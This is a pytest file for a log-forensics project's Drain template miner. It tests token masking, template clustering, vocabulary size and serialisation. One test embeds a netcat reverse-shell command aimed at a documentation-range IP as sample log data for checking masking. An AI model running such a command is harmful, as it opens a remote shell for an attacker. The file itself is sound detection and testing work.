"""Drain template mining. Pure Python — no torch, no infrastructure."""

from __future__ import annotations

import pytest

from forensics.inference.templates import (
    WILDCARD,
    DrainTemplateMiner,
    preprocess,
    tokenize,
)
from forensics.ingestion.generators import TelemetryGenerator


def test_masking_collapses_unbounded_token_classes() -> None:
    masked = preprocess(
        "sshd[4021]: Failed password for a.sharma from 203.0.113.9 port 44312 ssh2"
    )
    assert "<IP>" in masked
    assert "<NUM>" in masked
    assert "203.0.113.9" not in masked
    # Usernames are NOT masked — Drain discovers that position itself.
    assert "a.sharma" in masked


def test_masking_preserves_executable_paths() -> None:
    """Over-masking would erase the /bin/bash vs /bin/nc distinction."""
    masked = preprocess('exe="/bin/nc" cmd="nc -e /bin/sh 203.0.113.66 4444"')
    assert "/bin/nc" in masked
    assert "/bin/sh" in masked


def test_uuid_and_hex_are_masked() -> None:
    assert "<UUID>" in preprocess("id=65d78cbd-03f2-41a5-a03e-f1cb103776c6")
    assert "<HEX>" in preprocess("RSA SHA256:a1b2c3d4e5f60718")


def test_identical_shapes_collapse_to_one_template() -> None:
    miner = DrainTemplateMiner()
    first = miner.add("sshd[1]: Failed password for alice from 10.0.0.1 port 22 ssh2")
    second = miner.add("sshd[2]: Failed password for bob from 10.0.0.2 port 23 ssh2")
    assert first.cluster_id == second.cluster_id
    assert miner.vocabulary_size == 1


def test_varying_position_becomes_a_wildcard() -> None:
    miner = DrainTemplateMiner()
    miner.add("service started on node alpha")
    miner.add("service started on node beta")
    assert WILDCARD in miner.clusters[0].template


def test_different_messages_stay_separate() -> None:
    miner = DrainTemplateMiner()
    miner.add("sshd[1]: Failed password for alice from 10.0.0.1 port 22 ssh2")
    miner.add('audit: type=EXECVE pid=9 uid=0 comm="bash" exe="/bin/bash"')
    assert miner.vocabulary_size == 2


def test_match_does_not_mutate_the_tree() -> None:
    """Inference must not grow the vocabulary, or token ids stop meaning what
    they meant when the model was fitted."""
    miner = DrainTemplateMiner()
    miner.add("service started on node alpha")
    before = miner.vocabulary_size

    assert miner.match("service started on node gamma") is not None
    assert miner.match("a totally unrelated message shape entirely here now") is None
    assert miner.vocabulary_size == before


def test_generated_logs_produce_a_compact_vocabulary() -> None:
    generator = TelemetryGenerator(host_count=20, user_count=40, anomaly_rate=0.05, seed=7)
    events = []
    while len(events) < 20_000:
        events.extend(generator.next_events())

    miner = DrainTemplateMiner().fit(e.message for e in events[:20_000])
    # A vocabulary that grows with the data is a masking failure.
    assert 5 <= miner.vocabulary_size <= 40, miner.vocabulary_size


def test_depth_3_does_not_fragment_on_an_early_variable_token() -> None:
    """Regression: the username in `sudo: <user> : ...` is the second token.

    At depth 4 it becomes a tree branch and one log type shatters into a
    template per user — measured at 13 — so a user unseen during training
    produces an unknown token and ordinary activity looks novel.
    """
    messages = [
        f"sudo: user{i} : 3 incorrect password attempts ; TTY=pts/0 ; "
        f"PWD=/home/user{i} ; USER=root ; COMMAND=/bin/bash"
        for i in range(40)
    ]
    shallow = DrainTemplateMiner(depth=3).fit(messages)
    deep = DrainTemplateMiner(depth=4).fit(messages)

    assert shallow.vocabulary_size == 1
    assert deep.vocabulary_size > 5


def test_held_out_users_still_match() -> None:
    """The real generalisation test: users never seen during fitting."""
    train = [
        f"sudo: user{i} : 3 incorrect password attempts ; TTY=pts/0 ; "
        f"PWD=/home/user{i} ; USER=root ; COMMAND=/bin/bash"
        for i in range(20)
    ]
    miner = DrainTemplateMiner().fit(train)
    assert miner.match(
        "sudo: brand.new.person : 3 incorrect password attempts ; TTY=pts/0 ; "
        "PWD=/home/brand.new.person ; USER=root ; COMMAND=/bin/bash"
    ) is not None


def test_state_round_trips() -> None:
    generator = TelemetryGenerator(host_count=5, anomaly_rate=0.1, seed=3)
    events = []
    while len(events) < 3000:
        events.extend(generator.next_events())

    original = DrainTemplateMiner().fit(e.message for e in events[:3000])
    restored = DrainTemplateMiner.from_dict(original.to_dict())

    assert restored.vocabulary_size == original.vocabulary_size
    # Ids must survive: they are the model's token ids.
    for event in events[:500]:
        a = original.match(event.message)
        b = restored.match(event.message)
        assert (a is None) == (b is None)
        if a and b:
            assert a.cluster_id == b.cluster_id


@pytest.mark.parametrize("bad_depth", [0, 1, -3])
def test_depth_below_two_is_rejected(bad_depth: int) -> None:
    with pytest.raises(ValueError, match="depth"):
        DrainTemplateMiner(depth=bad_depth)


def test_tokenizer_drops_empty_tokens() -> None:
    assert "" not in tokenize("a=b,  c   d")
